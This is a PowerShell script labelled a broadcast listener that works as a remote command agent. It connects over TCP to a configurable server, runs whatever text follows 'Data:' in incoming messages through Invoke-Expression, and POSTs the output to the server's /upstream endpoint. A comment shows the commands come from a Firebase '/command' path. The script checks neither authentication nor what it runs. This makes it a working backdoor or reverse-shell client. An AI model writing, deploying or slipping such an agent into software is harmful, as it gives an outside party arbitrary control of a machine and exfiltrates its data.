# PowerShell Broadcast Listener
# Usage: .\listener.ps1 [server] [tcpPort] [httpPort]

param(
    [string]$server = "127.0.0.1",
    [int]$tcpPort = 8081,
    [int]$httpPort = 5005
)

try {
    # Create TCP client and connect
    $client = New-Object System.Net.Sockets.TcpClient($server, $tcpPort)
    $stream = $client.GetStream()
    $reader = New-Object System.IO.StreamReader($stream)

    Write-Host "Listening to broadcasts from $server`:$tcpPort" -ForegroundColor Green
    Write-Host "HTTP endpoint: http://$server`:$httpPort/upstream" -ForegroundColor Cyan
    Write-Host "Press Ctrl+C to stop listening" -ForegroundColor Yellow
    Write-Host ""

    while ($true) {
        # Check for incoming messages from server
        if ($stream.DataAvailable) {
            $message = $reader.ReadLine()
            if ($message -ne $null) {
                Write-Host "[Broadcast] $message" -ForegroundColor Cyan
                # sample print [Broadcast] [2025-11-30T16:29:52.395450] Firebase Change - Path: /command, Data: ls
                # extract the cmd after 'Data: '
                if ($message -match 'Data:\s*(.+)$') {
                    $cmd = $matches[1]
                    Write-Host "Executing command: $cmd" -ForegroundColor Green
                    # if cmd is not empty, execute it (if the cmd makes errors, ignore them)
                    # output should be send back to server as a text msg to POST /upstream
                    try {
                        if ($cmd.Trim() -ne "") {
                            # Execute command and capture output
                            $output = Invoke-Expression $cmd 2>&1 | Out-String
                            Write-Host "Command executed successfully" -ForegroundColor Green
                            Write-Host "Output: $output" -ForegroundColor Gray
                            
                            # Send output back to server as a text message to POST /upstream
                            $body = @{ output = $output } | ConvertTo-Json
                            try {
                                Invoke-RestMethod -Uri "http://${server}:${httpPort}/upstream" -Method POST -Body $body -ContentType "application/json" -ErrorAction Stop | Out-Null
                                Write-Host "Result sent to server" -ForegroundColor Green
                            }
                            catch {
                                Write-Host "Warning: Could not send result to server - $($_.Exception.Message)" -ForegroundColor Yellow
                            }
                        }
                    }
                    catch {
                        Write-Host "Error executing command: $($_.Exception.Message)" -ForegroundColor Red
                        # Send error back to server as a text message to POST /upstream
                        $errorOutput = "ERROR: $($_.Exception.Message)"
                        $body = @{ output = $errorOutput } | ConvertTo-Json
                        try {
                            Invoke-RestMethod -Uri "http://${server}:${httpPort}/upstream" -Method POST -Body $body -ContentType "application/json" -ErrorAction Stop | Out-Null
                            Write-Host "Error sent to server" -ForegroundColor Yellow
                        }
                        catch {
                            Write-Host "Warning: Could not send error to server" -ForegroundColor Yellow
                        }
                    }
                }
            }
        }
        Start-Sleep -Milliseconds 100
    }
}
catch {
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
}
finally {
    if ($reader) { $reader.Close() }
    if ($client) { $client.Close() }
    Write-Host "`nStopped listening" -ForegroundColor Yellow
}